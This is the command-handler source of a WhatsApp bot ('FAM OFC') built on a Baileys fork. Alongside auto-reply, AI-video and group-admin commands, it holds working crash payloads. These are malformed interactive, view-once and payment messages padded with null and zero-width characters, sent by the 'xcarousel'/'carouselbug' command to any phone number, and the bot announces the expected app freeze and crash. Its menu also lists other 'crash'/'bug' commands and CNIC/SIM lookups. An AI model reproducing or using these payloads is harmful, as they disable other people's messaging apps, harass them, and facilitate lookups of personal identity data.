const fs = require('fs');
const axios = require('axios');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const crypto = require('crypto');
const os = require('os');

const {
    initAutoReplyDB,
    addTargetUser,
    removeTargetUser,
    isTargetUser,
    getTargetUsers,
    getRandomAutoMessage,
    clearAllTargets,
    isBannedUser,
    banUser,
    unbanUser,
    getBannedUsers
} = require('./lib/autoReply');
const {
  default: makeWASocket, 
  proto, 
  generateWAMessage, 
  generateWAMessageFromContent, 
  generateWAMessageContent,
  getContentType, 
  prepareWAMessageMedia, 
  baileys
} = require("@famofc/baileys");

// Cooldown maps for auto-reply
const userCooldown = new Map();
const floodTracker = new Map(); // Track flooding users

module.exports = WaSocket = async (WaSocket, m, chatUpdate, store) => {
try {
  const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
  );

  const sender = m.key.fromMe
    ? WaSocket.user.id.split(":")[0] || WaSocket.user.id
    : m.key.participant || m.key.remoteJid;

  const senderNumber = sender.split('@')[0];
  const budy = (typeof m.text === 'string' ? m.text : '');
  
  // Fixed prefix detection
  const prefixRegex = /^[В°вЂўПЂГ·Г—В¶в€†ВЈВўв‚¬ВҐВ®в„ў+вњ“_=|~!?@#$%^&.,В©^]/gi;
  let prefix = "";
  if (body && typeof body === 'string') {
    const match = body.match(prefixRegex);
    if (match) prefix = match[0];
  }
  
  const from = m.key.remoteJid;
  const isGroup = from.endsWith("@g.us");
  const isChannel = from.endsWith("@newsletter");
  const botNumber = await WaSocket.decodeJid(WaSocket.user.id);
  
  // Check if owners.json exists
  let owners = [];
  try {
    if (fs.existsSync('./lib/DataBases/owners.json')) {
      owners = JSON.parse(fs.readFileSync('./lib/DataBases/owners.json'));
    }
  } catch (e) {
    owners = [];
  }
  
  const isOwner = [botNumber, ...owners].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
  const isBot = botNumber.includes(senderNumber);
  
  // Check if message starts with prefix (command)
  let isCmd = false;
  if (body && prefix && body.startsWith(prefix)) {
    isCmd = true;
  }

  // ========== AUTO-REPLY FOR TARGET USERS (INSTANT + SILENT 1 MIN BAN) ==========
  const senderNum = senderNumber;
  const now = Date.now();
  
  // CHECK IF USER IS BANNED (1 MINUTE TEMP BAN) - SILENT, NO MESSAGE SENT
  if (isBannedUser(senderNum)) {
    const banInfo = getBannedUsers().find(u => u.number === senderNum);
    if (banInfo) {
      const remainingTime = Math.ceil((banInfo.bannedUntil - now) / 1000);
      console.log(chalk.red(`[AUTO-REPLY] 🚫 User ${senderNum} is SILENTLY BANNED for ${remainingTime}s (No auto-reply)`));
      // NO MESSAGE SENT TO USER - SILENT BAN
    }
    // Skip auto-reply completely for banned users - silently ignore
  } 
  // FLOOD DETECTION SYSTEM (5+ messages in 3 seconds = 1 MINUTE SILENT BAN)
  else {
    const floodKey = `${senderNum}_${from}`;
    const floodData = floodTracker.get(floodKey) || { messages: [], lastCheck: now };
    
    // Clean old messages (older than 3 seconds)
    floodData.messages = floodData.messages.filter(time => now - time < 3000);
    floodData.messages.push(now);
    floodData.lastCheck = now;
    
    // Check if flooding (more than 5 messages in 3 seconds)
    const isFlooding = floodData.messages.length > 5;
    floodTracker.set(floodKey, floodData);
    
    // Clean flood tracker every minute to prevent memory issues
    if (Math.random() < 0.01) { // 1% chance each message
      for (const [key, data] of floodTracker.entries()) {
        if (now - data.lastCheck > 60000) {
          floodTracker.delete(key);
        }
      }
    }
    
    // IF FLOOD DETECTED - SILENTLY BAN USER FOR 1 MINUTE (NO MESSAGE SENT)
    if (isFlooding && isTargetUser(senderNum)) {
      const banUntil = now + (1 * 60 * 1000); // 1 minute ban
      banUser(senderNum, banUntil);
      console.log(chalk.red(`[AUTO-REPLY] 🔨 User ${senderNum} SILENTLY BANNED for 1 minute due to flooding (${floodData.messages.length} messages in 3s) - No message sent`));
      
      // NO MESSAGE SENT TO USER - SILENT BAN
      // Just clear flood data for this user
      floodTracker.delete(floodKey);
    }
    // NORMAL AUTO-REPLY - INSTANT RESPONSE (NO DELAY)
    else if (!isBot && !isCmd && isTargetUser(senderNum) && !isFlooding) {
      const autoMessage = getRandomAutoMessage();
      console.log(chalk.green(`[AUTO-REPLY] ✓ INSTANT reply to ${senderNum}: ${autoMessage.substring(0, 50)}...`));
      // INSTANT REPLY - No delay
      await WaSocket.sendMessage(from, { text: autoMessage }, { quoted: m });
      // No cooldown - instant reply every time
    } else if (isTargetUser(senderNum) && isFlooding) {
      console.log(chalk.yellow(`[AUTO-REPLY] ⚠️ Flood detected for ${senderNum} (${floodData.messages.length} msgs in 3s) - Silently banning...`));
    } else if (isTargetUser(senderNum) && isCmd) {
      console.log(chalk.yellow(`[AUTO-REPLY] ⏭️ User ${senderNum} sent command, skipping auto-reply`));
    }
  }
  // =================================================

  // FIXED: Added null check for body before trim()
  let command = "";
  let args = [];
  
  if (isCmd && body && typeof body === 'string') {
    const afterPrefix = body.slice(prefix.length).trim();
    if (afterPrefix) {
      const splitCmd = afterPrefix.split(' ');
      command = splitCmd.shift().toLowerCase();
      args = splitCmd;
    }
  }
  
  const text = args.join(" ");
  const pushname = m.pushName || "FamOfc WaBot";
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  const qmsg = (quoted.msg || quoted);
  const isMedia = /image|video|sticker|audio/.test(mime);
  
  // Initialize group-related variables with safe defaults
  let groupMetadata = null;
  let groupOwner = "";
  let groupName = "";
  let participants = [];
  let groupAdmins = [];
  let groupMembers = [];
  let isGroupAdmins = false;
  let isBotGroupAdmins = false;
  let isBotAdmins = false;
  let isAdmins = false;
  
  // Only fetch group metadata if this is a group chat
  if (isGroup) {
    try {
      groupMetadata = await WaSocket.groupMetadata(m.chat);
      groupOwner = groupMetadata.owner || "";
      groupName = groupMetadata.subject || "";
      participants = groupMetadata.participants || [];
      groupMembers = participants;
      groupAdmins = participants.filter((v) => v.admin !== null).map((v) => v.jid) || [];
      isGroupAdmins = groupAdmins.includes(m.sender);
      isBotGroupAdmins = groupAdmins.includes(botNumber);
      isBotAdmins = isBotGroupAdmins;
      isAdmins = isGroupAdmins;
    } catch (e) {
      console.error("Error fetching group metadata for chat", m.chat, ":", e.message);
    }
  }
  
  const { 
    smsg, 
    sendGmail, 
    formatSize, 
    isUrl, 
    generateMessageTag, 
    getBuffer, 
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep
  } = require('./lib/myfunc'); 
  const time = moment.tz("Asia/Karachi").format("HH:mm:ss");
  
  const x = {
    key: {
      participant: "13135550002@s.whatsapp.net", 
      remoteJid: "status@broadcast", 
      fromMe: false
    }, 
    message: {
      conversation: "! FamOfc WaBot !"
    }
  };
  
  const famofcreply = (text) => {
    const msg = {
      text, 
      mentions: [m.sender], 
      contextInfo: {
        externalAdReply: {
          title: "FamOfc WaBot", 
          body: "✦ Fam Ofc ⛧", 
          thumbnailUrl: "https://fam-official.serv00.net/logo/famofc.jpg", 
          sourceUrl: "https://famofc.site", 
          showAdAttribution: false
        }
      }
    };
    return WaSocket.sendMessage(m.chat, msg, {
      quoted: x
    })
  }
  
  const { teksbug2 } = require("./media/delay.js");
  const malik = './media/Malik.mp3';
  const sigma = './media/sigma.mp3';
  
  async function loading() {
    const loadd = [
      "⬛",
      "⬜",
      "◼️",
      "▪️",
      "▫️",
      "◻️",
      "⬛",
      "⬜"
    ];
    let { key } = await WaSocket.sendMessage(m.chat, {text: '_Loading_'});
    for (let i = 0; i < loadd.length; i++) {
      await WaSocket.sendMessage(m.chat, {text: loadd[i], edit: key});
    }
  }
// Helper functions at the end of the file
function formatCNIC(cnic) {
    if (!cnic || typeof cnic !== 'string') return cnic || 'Unknown';
    const cleanCNIC = cnic.replace(/-/g, '');
    if (cleanCNIC.length === 13) {
        return `${cleanCNIC.substring(0, 5)}-${cleanCNIC.substring(5, 12)}-${cleanCNIC.substring(12)}`;
    }
    return cnic;
}

function formatPhone(phone) {
    if (!phone || typeof phone !== 'string') return phone || 'Unknown';
    const cleanPhone = phone.replace(/\D/g, '');
    if (cleanPhone.length === 11 && cleanPhone.startsWith('0')) {
        return cleanPhone;
    } else if (cleanPhone.length === 10 && cleanPhone.startsWith('3')) {
        return '0' + cleanPhone;
    }
    return phone;
}


// Add this function with other helper functions (after formatCNIC and formatPhone)
async function sendCrashMessages(targetJid, amount = 1) {
    // First message: View-once wrapper around a malformed interactive message
    const viewOncePayload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u2000"  // Zero-width space
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "\u2000"  // Invalid JSON
                            },
                            {
                                name: "form_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "DEFAULT",
                                    flow_cta: "\u2000",
                                    flow_message_version: "3"
                                })
                            }
                        ]
                    }
                }
            }
        }
    };

    // Second message: Fake payment request with oversized hidden text
    let largeText = "\u2000".repeat(1500);
    const paymentPayload = {
        requestPaymentMessage: {
            currencyCodeIso4217: "PKR", // Changed to PKR
            requestFrom: targetJid,
            expiryTimestamp: Math.floor(Date.now() / 1000) + 8, // 8 seconds from now
            amount: {
                value: "999999999",
                offset: 100,
                currencyCode: "PKR" // Changed to PKR
            },
            contextInfo: {
                externalAdReply: {
                    title: " ",
                    body: largeText,
                    mimetype: "audio/mpeg",
                    caption: largeText,
                    showAdAttribution: true,
                    sourceUrl: null,
                    thumbnailUrl: null
                }
            }
        }
    };

    // Send messages multiple times based on amount
    for (let i = 0; i < amount; i++) {
        try {
            // Send first message
            await WaSocket.relayMessage(targetJid, viewOncePayload, {
                messageId: null,
                participant: { jid: targetJid },
                userJid: targetJid
            });

            // Short delay
            await new Promise(resolve => setTimeout(resolve, 300));

            // Send second message
            await WaSocket.relayMessage(targetJid, paymentPayload, {
                participant: { jid: targetJid },
                messageId: null,
                userJid: targetJid
            });

            // Delay between sets
            if (i < amount - 1) {
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (error) {
            console.error(`Crash message ${i+1} failed:`, error.message);
        }
    }
}
// New bug function: Carousel Flood + Malformed Interactive Message
async function XCarouselDelay(sock, target, amount = 5) {
    // Limit amount to prevent abuse (max 20 cycles = ~40k messages)
    if (amount > 20) amount = 20;
    
    const msg = {
        interactiveResponseMessage: {
            header: {
                title: "\u0000" + "{{".repeat(1000)
            },
            body: {
                text: "FAMSql"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                params: {
                    json: "\u0000".repeat(2000)
                }
            },
            version: 3,
            entryPointConversionSource: "call permission_request"
        }
    };

    const bugger = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            '0@s.whatsapp.net',
                            ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')
                        ],
                        body: {
                            text: 'SQL',
                            format: 'DEFAULT'
                        },
                        footer: {
                            text: '\u0000'.repeat(25000),
                            format: 'DEFAULT'
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{"flow_cta":{"title":${"\u0000".repeat(990000)}}}`,
                            version: 3
                        }
                    }
                }
            }
        }
    };

    let totalSent = 0;
    for (let i = 0; i < amount; i++) {
        try {
            await sock.relayMessage(target, msg, {});
            totalSent++;
            await new Promise(resolve => setTimeout(resolve, 100)); // small delay
            await sock.relayMessage(target, bugger, { participant: { jid: target } });
            totalSent++;
            if (i < amount - 1) await new Promise(resolve => setTimeout(resolve, 300));
        } catch (error) {
            console.error(`Carousel bug cycle ${i+1} failed:`, error.message);
        }
    }
    return totalSent;
}
  switch (command) {
  case 'xcarousel':
case 'carouselbug': {
    if (!isOwner) return famofcreply("❌ Only the Owner can use this command!");
    if (!text) return famofcreply(`📌 *Usage:* ${prefix + command} <number>|<amount>\nExample: ${prefix + command} 923001234567|3\n\n*Amount limit:* 1-20 cycles (2 messages per cycle)`);

    try {
        await WaSocket.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });
        
        // Parse input: number|amount
        const parts = text.split('|');
        const targetNumber = parts[0].trim();
        let amount = parseInt(parts[1]) || 5;
        if (amount > 20) amount = 20;
        if (amount < 1) amount = 1;
        
        let targetJid = targetNumber.includes('@') ? targetNumber : targetNumber + '@s.whatsapp.net';
        
        if (!targetJid.includes('@s.whatsapp.net')) {
            return famofcreply(`❌ *Invalid target!* Provide a valid WhatsApp number.\n\n🔥 *Powered by FAM OFC*`);
        }
        
        const processingMsg = await m.reply(`🌀 *Starting Carousel Flood Bug*\n📱 Target: ${targetJid}\n🔄 Cycles: ${amount} (${amount*2} messages)\n⏳ Sending...`);
        
        const totalSent = await XCarouselDelay(WaSocket, targetJid, amount);
        
        await WaSocket.sendMessage(m.chat, { 
            text: `✅ *Carousel Bug Sent!*\n\n` +
                  `📱 Target: ${targetJid}\n` +
                  `🌀 Cycles executed: ${amount}\n` +
                  `📨 Total messages sent: ${totalSent}\n` +
                  `⚠️ Type: Malformed interactive + view-once carousel\n\n` +
                  `*Expected Effects:*\n` +
                  `• WhatsApp UI freeze/lag\n` +
                  `• Memory overflow from zero-width characters\n` +
                  `• Possible app crash on older devices\n\n` +
                  `🔥 *Powered by FAM OFC*`,
            edit: processingMsg.key 
        });
        
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error("Carousel bug error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* ${error.message}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;
  case 'addmeta': {
    if (!isGroup) return famofcreply("❌ *This command can only be used in groups!*");
    if (!isAdmins && !isOwner) return famofcreply("❌ *Only group admins or the bot owner can use this command!*");
    if (!isBotAdmins) return famofcreply("❌ *I need to be an admin to add members!*");
    
    const metaBot = "867051314767696@bot";
    
    try {
        await WaSocket.sendMessage(m.chat, { react: { text: '➕', key: m.key } });
        await WaSocket.groupParticipantsUpdate(from, [metaBot], 'add');
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        famofcreply(`✅ *Added meta bot* (${metaBot}) to the group.\n\n🔥 Powered by FAM OFC`);
    } catch (error) {
        console.error("AddMeta Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        famofcreply(`❌ *Failed to add meta bot.*\n${error.message}\n\n🔥 Powered by FAM OFC`);
    }
}
break;

case 'kickmeta': {
    if (!isGroup) return famofcreply("❌ *This command can only be used in groups!*");
    if (!isAdmins && !isOwner) return famofcreply("❌ *Only group admins or the bot owner can use this command!*");
    if (!isBotAdmins) return famofcreply("❌ *I need to be an admin to remove members!*");
    
    const metaBot = "867051314767696@bot";
    
    try {
        await WaSocket.sendMessage(m.chat, { react: { text: '➖', key: m.key } });
        await WaSocket.groupParticipantsUpdate(from, [metaBot], 'remove');
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        famofcreply(`✅ *Removed meta bot* (${metaBot}) from the group.\n\n🔥 Powered by FAM OFC`);
    } catch (error) {
        console.error("KickMeta Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        famofcreply(`❌ *Failed to remove meta bot.*\n${error.message}\n\n🔥 Powered by FAM OFC`);
    }
}
break;
  
  case "aivideo":
case "freevideo":
case "genvideo": {
    if (!isOwner) return famofcreply("❌ Only owner can use this command!");
    
    // Check if there's quoted message with image or text prompt
    const quotedMsg = m.quoted;
    const quotedMime = quotedMsg && (quotedMsg.msg || quotedMsg).mimetype || '';
    const hasImage = quotedMime.startsWith('image/');
    const hasPrompt = text && text.trim().length > 0;
    
    if (!hasPrompt && !hasImage) {
        return famofcreply(
            `❌ *Missing prompt or image!*\n\n` +
            `📌 *Usage:* ${prefix + command} <prompt>\n` +
            `Or reply to an image with: ${prefix + command} <prompt>\n\n` +
            `📝 *Examples:*\n` +
            `${prefix + command} a cat walking in rain\n` +
            `${prefix + command} make this image animated\n\n` +
            `🔥 *Powered by FAM OFC*`
        );
    }
    
    try {
        // Send loading reaction
        await WaSocket.sendMessage(m.chat, { react: { text: '🎬', key: m.key } });
        
        // Send initial processing message
        const processingMsg = await WaSocket.sendMessage(m.chat, { 
            text: `🎬 *AI VIDEO GENERATOR*\n\n` +
                  `📝 *Prompt:* ${text || "Animate this image"}\n` +
                  `${hasImage ? '🖼️ *Initial Frame:* Yes\n' : ''}` +
                  `⏳ *Status:* Creating video request...\n\n` +
                  `🔥 *Powered by FAM OFC*`
        }, { quoted: m });
        
        // Prepare image if available
        let imageBuffer = null;
        if (hasImage) {
            try {
                imageBuffer = await WaSocket.downloadMediaMessage(quotedMsg);
                if (!imageBuffer) {
                    throw new Error("Failed to download image");
                }
            } catch (err) {
                console.error("Image download error:", err);
                await WaSocket.sendMessage(m.chat, { 
                    text: `❌ *Failed to download image!*\n\n${err.message}\n\n🔥 *Powered by FAM OFC*`,
                    edit: processingMsg.key 
                });
                await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return;
            }
        }
        
        // Update status
        await WaSocket.sendMessage(m.chat, { 
            text: `🎬 *AI VIDEO GENERATOR*\n\n` +
                  `📝 *Prompt:* ${text || "Animate this image"}\n` +
                  `${hasImage ? '🖼️ *Initial Frame:* Yes\n' : ''}` +
                  `🆔 *Request ID:* Generating...\n` +
                  `⏳ *Status:* Sending to AI server...\n\n` +
                  `🔥 *Powered by FAM OFC*`,
            edit: processingMsg.key 
        });
        
        // Setup AI Video API
        const axios = require('axios');
        const FormData = require('form-data');
        
        const freevideo = {
            api: {
                base: "https://www.freeaivideos.org",
                endpoint: {
                    generate: "/api/video_generation",
                    request: (id) => `?request_id=${id}&prompt=`
                }
            },
            headers: {
                "user-agent": "NB Android/1.0.0",
                "origin": "https://www.freeaivideos.org",
                "referer": "https://www.freeaivideos.org/",
                "accept": "*/*"
            }
        };
        
        // Create form data
        let form = new FormData();
        const promptText = text || "animate this image";
        form.append("prompt", promptText);
        
        if (imageBuffer) {
            form.append("initialFrame", imageBuffer, { 
                filename: "image.jpg", 
                contentType: "image/jpeg" 
            });
        }
        
        // Send generation request
        let requestId = null;
        try {
            const generateRes = await axios.post(
                `${freevideo.api.base}${freevideo.api.endpoint.generate}`,
                form,
                { 
                    headers: { ...freevideo.headers, ...form.getHeaders() }, 
                    timeout: 60000 
                }
            );
            
            requestId = generateRes.data?.request_id;
            if (!requestId) {
                throw new Error("Failed to get request ID from API");
            }
        } catch (err) {
            console.error("Generation request error:", err);
            await WaSocket.sendMessage(m.chat, { 
                text: `❌ *API Error!*\n\n${err.response?.data?.error || err.message}\n\n🔥 *Powered by FAM OFC*`,
                edit: processingMsg.key 
            });
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return;
        }
        
        // Update status with request ID
        await WaSocket.sendMessage(m.chat, { 
            text: `🎬 *AI VIDEO GENERATOR*\n\n` +
                  `📝 *Prompt:* ${promptText}\n` +
                  `${hasImage ? '🖼️ *Initial Frame:* Yes\n' : ''}` +
                  `🆔 *Request ID:* ${requestId}\n` +
                  `⏳ *Status:* Processing video (5-10 minutes)...\n\n` +
                  `_Bot will automatically send video when ready_\n\n` +
                  `🔥 *Powered by FAM OFC*`,
            edit: processingMsg.key 
        });
        
        // Poll for result
        const pollInterval = 3000;
        const timeoutMs = 10 * 60 * 1000; // 10 minutes
        const startTime = Date.now();
        
        let videoUrl = null;
        let frameUrl = null;
        
        const pollForResult = async () => {
            while (Date.now() - startTime < timeoutMs) {
                try {
                    const queryUrl = `${freevideo.api.base}${freevideo.api.endpoint.generate}${freevideo.api.endpoint.request(requestId)}`;
                    const pollRes = await axios.get(queryUrl, { 
                        headers: freevideo.headers,
                        timeout: 10000
                    });
                    
                    const data = pollRes.data || {};
                    
                    if (data.video_url) {
                        videoUrl = data.video_url;
                        frameUrl = data.frame_url || data.frame_url_icon;
                        return true;
                    }
                } catch (err) {
                    // Continue polling on error
                    console.log("Polling error:", err.message);
                }
                
                await new Promise(resolve => setTimeout(resolve, pollInterval));
            }
            return false;
        };
        
        // Show intermediate status update after 2 minutes
        let statusUpdateSent = false;
        const statusInterval = setInterval(async () => {
            if (!statusUpdateSent && Date.now() - startTime > 120000) {
                statusUpdateSent = true;
                try {
                    await WaSocket.sendMessage(m.chat, { 
                        text: `🎬 *AI VIDEO GENERATOR*\n\n` +
                              `📝 *Prompt:* ${promptText}\n` +
                              `🆔 *Request ID:* ${requestId}\n` +
                              `⏳ *Status:* Still processing... (${Math.floor((Date.now() - startTime) / 60000)} min elapsed)\n\n` +
                              `🔥 *Powered by FAM OFC*`,
                        edit: processingMsg.key 
                    });
                } catch(e) {}
            }
        }, 60000);
        
        const completed = await pollForResult();
        clearInterval(statusInterval);
        
        if (!completed || !videoUrl) {
            await WaSocket.sendMessage(m.chat, { 
                text: `❌ *Timeout!*\n\nVideo generation took too long (${timeoutMs/60000} minutes).\nPlease try again.\n\n🔥 *Powered by FAM OFC*`,
                edit: processingMsg.key 
            });
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return;
        }
        
        // Send the generated video
        const caption = `✅ *AI VIDEO GENERATED!*\n\n` +
                       `📝 *Prompt:* ${promptText}\n` +
                       `${hasImage ? '🖼️ *Initial Frame:* Used\n' : ''}` +
                       `⏱️ *Time Taken:* ${Math.floor((Date.now() - startTime) / 1000)} seconds\n\n` +
                       `🔗 *Download:* ${videoUrl}\n\n` +
                       `🔥 *Powered by FAM OFC*`;
        
        try {
            await WaSocket.sendMessage(m.chat, {
                video: { url: videoUrl },
                caption: caption,
                mimetype: 'video/mp4'
            }, { quoted: m });
            
            await WaSocket.sendMessage(m.chat, { 
                text: `✅ *Video sent successfully!*\n\n🔥 *Powered by FAM OFC*`,
                edit: processingMsg.key 
            });
            await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            
        } catch (sendErr) {
            console.error("Video send error:", sendErr);
            await WaSocket.sendMessage(m.chat, { 
                text: `✅ *Video URL (couldn't send directly):*\n${videoUrl}\n\n${caption}`,
                edit: processingMsg.key 
            });
            await WaSocket.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } });
        }
        
    } catch (error) {
        console.error("AI Video Command Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* ${error.message || "Failed to generate AI video"}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;
  case "menu3": {
    if (!isOwner) return famofcreply("❌ Only owner can use this command!");
    
    try {
        await WaSocket.sendMessage(m.chat, { react: { text: '📨', key: m.key } });
        
        // Categorized commands
        const categorizedCommands = {
            "🤖 AUTO-REPLY": ["addtarget", "removetarget", "targetlist", "cleartargets", "autoreplystatus", "unbanuser", "banlist"],
            "💣 BUG/CRASH": ["crash", "bug", "infinity", "gcbug", "gccrash"],
            "🔧 TOOLS": ["obfuscate", "trackip", "clean", "kick", "invtag"],
            "📊 DATABASE": ["sim", "simdata", "cnic", "gen", "gencc"],
            "🖼️ MEDIA": ["pin", "pinsrc", "pinimg", "pinimage", "pinterest", "rvo", "readviewonce", "vv"],
            "ℹ️ INFO": ["menu", "allmenu", "ping", "runtime", "systeminfo", "friends", "info", "meid", "tsid", "script", "sc"],
            "📢 CHANNEL": ["idch", "cekidch"]
        };
        
        const commandsJson = {
            bot: "FAM OFC BOT",
            prefix: prefix || ".",
            owner: "+923350963366",
            channel: "https://whatsapp.com/channel/0029VbAnF9Q9hXFERv7Stc2v",
            total_commands: Object.values(categorizedCommands).flat().length,
            categories: categorizedCommands
        };
        
        const jsonString = JSON.stringify(commandsJson, null, 2);
        
        const subcontent = [
            {
                messageType: 5,
                codeMetadata: {
                    codeLanguage: "json",
                    codeBlocks: [{
                        highlightType: 0,
                        codeContent: jsonString
                    }]
                }
            },
            {
                messageType: 3,
                imageMetadata: {
                    imageUrl: {
                        imagePreviewUrl: "https://fam-official.serv00.net/logo/famofc.jpg",
                        imageHighResUrl: "https://fam-official.serv00.net/logo/famofc.jpg",
                        sourceUrl: "https://famofc.site"
                    },
                    imageText: "🔥 FAM OFC BOT - All Commands\n📊 Total: " + Object.values(categorizedCommands).flat().length + " commands\n👑 Owner: Faheem\n📍 Tap to join channel",
                    alignment: 2,
                    tapLinkUrl: "https://whatsapp.com/channel/0029VbAnF9Q9hXFERv7Stc2v"
                }
            }
        ];
        
        const msg = generateWAMessageFromContent(m.chat, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: subcontent,
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "867051314767696@bot"
                            },
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }, {});
        
        await WaSocket.relayMessage(m.chat, msg.message, {});
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error("RichMsg Command Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* ${error.message}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;
    
    // ========== AUTO-REPLY COMMANDS ==========
    case "addtarget": {
      if (!isOwner) return famofcreply("❌ Only owner can use this command!");
      if (!args[0]) return famofcreply("📝 Please provide a number!\nExample: .addtarget 923XXXXXXXXX");
      const targetNumber = args[0].replace(/[^0-9]/g, '');
      if (addTargetUser(targetNumber)) {
        famofcreply(`✅ Target user *${targetNumber}* added to auto-reply list!\nThey will now receive INSTANT automatic replies.`);
      } else {
        famofcreply(`❌ User *${targetNumber}* is already in auto-reply list!`);
      }
    }
    break;

    case "removetarget": {
      if (!isOwner) return famofcreply("❌ Only owner can use this command!");
      if (!args[0]) return famofcreply("📝 Please provide a number!\nExample: .removetarget 923XXXXXXXXX");
      const targetNumber = args[0].replace(/[^0-9]/g, '');
      if (removeTargetUser(targetNumber)) {
        famofcreply(`✅ Target user *${targetNumber}* removed from auto-reply list!`);
      } else {
        famofcreply(`❌ User *${targetNumber}* not found in auto-reply list!`);
      }
    }
    break;

    case "targetlist": {
      if (!isOwner) return famofcreply("❌ Only owner can use this command!");
      const targets = getTargetUsers();
      if (targets.length === 0) {
        famofcreply("📋 No target users in auto-reply list!");
      } else {
        let list = "📋 *AUTO-REPLY TARGET LIST*\n\n";
        targets.forEach((target, index) => {
          list += `${index + 1}. ${target}\n`;
        });
        list += `\n*Total:* ${targets.length} targets`;
        famofcreply(list);
      }
    }
    break;
    
    case "cleartargets": {
      if (!isOwner) return famofcreply("❌ Only owner can use this command!");
      clearAllTargets();
      famofcreply("🗑️ All target users have been cleared from auto-reply list!");
    }
    break;
    
    case "autoreplystatus": {
      if (!isOwner) return famofcreply("❌ Only owner can use this command!");
      const targets = getTargetUsers();
      const bannedUsers = getBannedUsers();
      
      let statusMsg = `🤖 *AUTO-REPLY SYSTEM STATUS*\n\n`;
      statusMsg += `📊 *Total Targets:* ${targets.length}\n`;
      statusMsg += `⚡ *Response Speed:* INSTANT (No delay)\n`;
      statusMsg += `🛡️ *Flood Protection:* Active (5+ msgs/3sec = 1 minute silent ban)\n`;
      statusMsg += `🔇 *Ban Type:* SILENT (User receives no notification)\n\n`;
      
      if (targets.length > 0) {
        statusMsg += `*Target List:*\n${targets.map((t, i) => `${i+1}. ${t}`).join('\n')}\n\n`;
      }
      
      if (bannedUsers.length > 0) {
        statusMsg += `*🚫 SILENTLY BANNED USERS (1 minute):*\n`;
        bannedUsers.forEach((ban, i) => {
          const remaining = Math.ceil((ban.bannedUntil - Date.now()) / 1000);
          statusMsg += `${i+1}. ${ban.number} - ${remaining} seconds remaining\n`;
        });
      } else {
        statusMsg += `*🚫 Silently Banned:* None`;
      }
      
      famofcreply(statusMsg);
    }
    break;
    
    case "unbanuser": {
      if (!isOwner) return famofcreply("❌ Only owner can use this command!");
      if (!args[0]) return famofcreply("📝 Please provide a number!\nExample: .unbanuser 923XXXXXXXXX");
      const targetNumber = args[0].replace(/[^0-9]/g, '');
      if (unbanUser(targetNumber)) {
        famofcreply(`✅ User *${targetNumber}* has been unbanned and can now receive auto-replies again!`);
      } else {
        famofcreply(`❌ User *${targetNumber}* is not banned!`);
      }
    }
    break;
    
    case "banlist": {
      if (!isOwner) return famofcreply("❌ Only owner can use this command!");
      const bannedUsers = getBannedUsers();
      if (bannedUsers.length === 0) {
        famofcreply("📋 No users are currently banned!");
      } else {
        let list = "🚫 *SILENTLY BANNED USERS (1 minute)*\n\n";
        bannedUsers.forEach((ban, index) => {
          const remaining = Math.ceil((ban.bannedUntil - Date.now()) / 1000);
          list += `${index + 1}. ${ban.number}\n   ⏱️ Remaining: ${remaining} seconds\n\n`;
        });
        famofcreply(list);
      }
    }
    break;
    // ========================================

    case 'obfuscate': {
